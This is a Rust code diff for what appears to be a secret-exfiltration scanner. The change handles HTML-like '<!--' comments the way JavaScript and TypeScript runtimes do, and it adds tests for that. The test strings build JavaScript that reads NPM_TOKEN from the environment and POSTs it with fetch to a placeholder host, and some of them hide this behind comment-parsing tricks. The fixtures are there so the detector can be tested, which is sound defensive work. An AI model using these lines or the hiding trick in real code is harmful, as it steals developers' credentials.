@@ -3590,6 +3590,11 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
     let pack = crate::pack::current();
     let path = u("script.js");
     let tree = match crate::jsparse::parse_file(&path, text) {
+        // (F-12: an HTML-like `<!--` after code, a comment to V8, is `<` `!` `--` to tsc, and a TypeScript file's
+        // text is read here as JavaScript first: what the comment hides may be code tsc runs. Then the text is read
+        // as tsc reads it, which sees that code, when that reading parses; when it does not, no runtime runs it
+        // so, and the comment's reading stands.)
+        Ok(t) if t.html_after_code => crate::jsparse::parse_with(text, false, true, false).unwrap_or(t),
         Ok(t) => t,
         // (TypeScript, which the hosts hand as JavaScript)
         Err(_) => match crate::jsparse::parse_file(&u("script.ts"), text) {
@@ -3684,6 +3689,19 @@ mod tests {
             Some(f) => f.received.map(|(_, cat)| cat),
             None => panic!("not read: {}", src),
         }
+    }
+
+    #[test]
+    fn html_like_comments_are_read_as_the_runtimes_read_them() {
+        // (F-12) a file that opens with `<!--` is read, as V8 reads a script (it did not parse before)
+        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        assert_eq!(sent(&format!("<!-- a banner\nconst v = process.env.NPM_TOKEN;\n{}", post)), found("environment", "NPM_TOKEN"));
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n--> a close\n{}", post)), found("environment", "NPM_TOKEN"));
+        // after code, `<!--` is `<` `!` `--` to tsc (this text may be a TypeScript file's): what follows it is read
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN; let y = 1;\nz = 5 <!--y, {}", post)), found("environment", "NPM_TOKEN"));
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN; let y = 1;\nz = 5\n<!--y, {}", post)), found("environment", "NPM_TOKEN"));
+        // and where that reading is no program, no runtime runs it so: the comment's reading stands
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n<!-- a note\n{}", post)), found("environment", "NPM_TOKEN"));
     }
 
     #[test]
